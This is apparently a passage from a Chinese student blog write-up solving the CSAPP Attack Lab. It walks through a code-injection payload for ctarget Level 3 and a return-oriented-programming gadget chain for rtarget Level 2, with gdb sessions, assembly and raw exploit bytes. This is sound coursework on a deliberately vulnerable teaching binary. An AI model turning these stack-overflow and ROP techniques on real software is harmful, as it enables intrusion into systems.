<p>这次我们传入的是一个字符串，然后将这个字符串与<code>cookie</code>进行对比。因此我们要把<code>cookie</code>压入<code>%rdi</code>，然后调用地址为<code>0x4018fa</code>的<code>touch3()</code>。但注意此时<code>cookie</code>是字符串，我们需要转换为ASCII码<code>35 39 62 39 39 37 66 61</code>。所以我们这个时候压入的应该是这个字符串的首地址，我们需要把这个字符串保存在<code>test()</code>的栈帧，因此运用<code>gdb</code>找下栈帧位置：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> b <span class="token builtin class-name">test</span>
Breakpoint <span class="token number">1</span> at 0x401968: <span class="token function">file</span> visible.c, line <span class="token number">90</span>.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> r <span class="token parameter variable">-qi</span> p2
Starting program: /mnt/c/Users/eagle/Documents/Repos/Eagle233-In-Class-Practices/CSAPP/Lab3 - attack lab/lab3/target1/ctarget <span class="token parameter variable">-qi</span> p2
<span class="token punctuation">[</span>Thread debugging using libthread_db enabled<span class="token punctuation">]</span>
Using <span class="token function">host</span> libthread_db library <span class="token string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="token builtin class-name">.</span>
Cookie: 0x59b997fa

Breakpoint <span class="token number">1</span>, <span class="token builtin class-name">test</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> at visible.c:90
<span class="token number">90</span>      visible.c: No such <span class="token function">file</span> or directory.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> s
<span class="token number">92</span>      <span class="token keyword keyword-in">in</span> visible.c
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disas
Dump of assembler code <span class="token keyword keyword-for">for</span> <span class="token keyword keyword-function">function</span> test:
   0x0000000000401968 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:     sub    <span class="token variable">$0x8</span>,%rsp
<span class="token operator">=</span><span class="token operator">&gt;</span> 0x000000000040196c <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:     mov    <span class="token variable">$0x0</span>,%eax
   0x0000000000401971 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span>:     call   0x4017a8 <span class="token operator">&lt;</span>getbuf<span class="token operator">&gt;</span>
   0x0000000000401976 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:    mov    %eax,%edx
   0x0000000000401978 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>:    mov    <span class="token variable">$0x403188</span>,%esi
   0x000000000040197d <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    mov    <span class="token variable">$0x1</span>,%edi
   0x0000000000401982 <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>:    mov    <span class="token variable">$0x0</span>,%eax
   0x0000000000401987 <span class="token operator">&lt;</span>+3<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    call   0x400df0 <span class="token operator">&lt;</span>__printf_chk@plt<span class="token operator">&gt;</span>
   0x000000000040198c <span class="token operator">&lt;</span>+3<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>:    <span class="token function">add</span>    <span class="token variable">$0x8</span>,%rsp
   0x0000000000401990 <span class="token operator">&lt;</span>+4<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:    ret
End of assembler dump.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> p/x <span class="token variable">$rsp</span>
<span class="token variable">$1</span> <span class="token operator">=</span> 0x5561dca8
</code></pre><p>因此栈帧在<code>0x5561dca8</code>。将其作为字符串首地址，编写<code>p3.s</code>：</p>
<pre data-role="codeBlock" data-info="asm" class="language-asm asm"><code>movq $0x5561dca8, %rdi
pushq $0x4018fa
ret
</code></pre><p>利用附录B的字节表示生成工具：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>gcc <span class="token parameter variable">-c</span> p3.s
objdump <span class="token parameter variable">-d</span> p3.o <span class="token operator">&gt;</span> p3.d
</code></pre><p>得到字节表示：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>p3.o:     <span class="token function">file</span> <span class="token function">format</span> elf64-x86-64


Disassembly of section .text:

0000000000000000 <span class="token operator">&lt;</span>.text<span class="token operator">&gt;</span>:
   <span class="token number">0</span>:	<span class="token number">48</span> c7 c7 a8 <span class="token function">dc</span> <span class="token number">61</span> <span class="token number">55</span> 	mov    <span class="token variable">$0x5561dca8</span>,%rdi
   <span class="token number">7</span>:	<span class="token number">68</span> fa <span class="token number">18</span> <span class="token number">40</span> 00       	push   <span class="token variable">$0x4018fa</span>
   c:	c3                   	ret    
</code></pre><p>我们就得到了字节序列：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token number">48</span> c7 c7 a8 <span class="token function">dc</span> <span class="token number">61</span> <span class="token number">55</span> <span class="token number">68</span> 
fa <span class="token number">18</span> <span class="token number">40</span> 00 c3
</code></pre><p>还是放到缓冲区的前40个字节。接着找到<code>getbuf()</code>栈顶的地址为<code>0x5561dc78</code>，作为40个字节之后的内容。</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token number">48</span> c7 c7 a8 <span class="token function">dc</span> <span class="token number">61</span> <span class="token number">55</span> <span class="token number">68</span> 
fa <span class="token number">18</span> <span class="token number">40</span> 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
<span class="token number">78</span> <span class="token function">dc</span> <span class="token number">61</span> <span class="token number">55</span> 00 00 00 00
</code></pre><p>可是我们字符串首地址<code>0x5561dca8</code>距离<code>getbuf()</code>的栈帧有多远？这决定了我们应该在注入字符串的何处放置我们的字符串。经过计算，<code>0x5561dca8 - 0x5561dc78 = 0x30</code>，正好是48个字节，也就是说，从49-56个字节处，我们就可以放置我们的字符串，这样我们编写的汇编代码就能顺利跳转到字符串的首地址。于是我们可以写出序列到<code>p3.txt</code>：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token number">48</span> c7 c7 a8 <span class="token function">dc</span> <span class="token number">61</span> <span class="token number">55</span> <span class="token number">68</span> 
fa <span class="token number">18</span> <span class="token number">40</span> 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
<span class="token number">78</span> <span class="token function">dc</span> <span class="token number">61</span> <span class="token number">55</span> 00 00 00 00
<span class="token number">35</span> <span class="token number">39</span> <span class="token number">62</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">37</span> <span class="token number">66</span> <span class="token number">61</span>
</code></pre><p>然后运行：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>./hex2raw <span class="token operator">&lt;</span> p3.txt <span class="token operator">&gt;</span> p3
./ctarget <span class="token parameter variable">-qi</span> p3
</code></pre><p>运行成功了！</p>
<p><img src="https://s2.loli.net/2025/05/31/fvLcbY23JyRCMdW.png" alt="1_level_3.png"></p>
<hr>
<h2 id="返回导向编程攻击">返回导向编程攻击 </h2>
<p>这一部分主要实现了两种防止攻击的手段：</p>
<ul>
<li><strong>栈地址随机化</strong></li>
<li><strong>限制的可执行代码区域</strong></li>
</ul>
<p>这导致我们的攻击变得困难起来了，但是文档提供了<strong>ROP</strong>的攻击手段。</p>
<h3 id="level-2-1">Level 2 </h3>
<p>我们有几个最基本的代码：<br>
<code>ret</code>: <code>0xc3</code><br>
<code>nop</code>: <code>0x90</code></p>
<p>我们要找到能将<code>cookie</code>作为第一个参数传入<code>touch2()</code>的<strong>Gadgets</strong>。先查看<code>rtarget</code>的汇编代码：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>objdump <span class="token parameter variable">-d</span> rtarget <span class="token operator">&gt;</span> rtarget.s
</code></pre><p>我们可以先把<code>cookie</code>存到某一个寄存器里面，然后再将这个寄存器存到<code>%rdi</code>里面。我们可以写出如下汇编代码：</p>
<pre data-role="codeBlock" data-info="asm" class="language-asm asm"><code>popq %rax
ret

movq %rax, %rdi
ret
</code></pre><p>为什么选用的是<code>%rax</code>？因为我们可以找到：</p>
<pre data-role="codeBlock" data-info="asm" class="language-asm asm"><code>00000000004019a0 &lt;addval_273&gt;:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret    
</code></pre><p>其中<code>48 89 c7 c3</code>通过查表3A可知，就是<code>movq %rax, %rdi / ret</code>的意思，地址是<code>0x4019a0 + 0x2 = 0x4019a2</code>。因此我们可以找找<code>popq %rax / ret</code>对应的字节级表示。发现：</p>
<pre data-role="codeBlock" data-info="asm" class="language-asm asm"><code>00000000004019ca &lt;getval_280&gt;:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret    
</code></pre><p>这里的<code>90</code>是<code>no op</code>的意思，所以也可以构成我们需要的指令，地址为<code>0x4019ca + 0x2 = 0x4019cc</code>。</p>
<p>找到<code>touch2()</code>的地址为<code>0x4017ec</code>，因此我们转换为字节级表示写入<code>p4.txt</code>：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00
fa <span class="token number">97</span> b9 <span class="token number">59</span> 00 00 00 00
a2 <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00
ec <span class="token number">17</span> <span class="token number">40</span> 00 00 00 00 00
</code></pre><p>然后运行：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>./hex2raw <span class="token operator">&lt;</span> p4.txt <span class="token operator">&gt;</span> p4
./rtarget <span class="token parameter variable">-qi</span> p4
</code></pre><p>运行成功了！</p>
<p><img src="https://s2.loli.net/2025/05/31/wpQiMTSdW4C9grB.png" alt="2_level_2.png"></p>
<hr>
<h3 id="level-3-1">Level 3 </h3>
<p>考虑到<code>Writeup.pdf</code>中的：</p>
<blockquote>
<p>You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations, consider stopping right now.</p>
</blockquote>
<p>在之后再对这一关深入研究。</p>
<hr>

      </div>
      
      
    
    
    
    
    
    
  
    </body></html>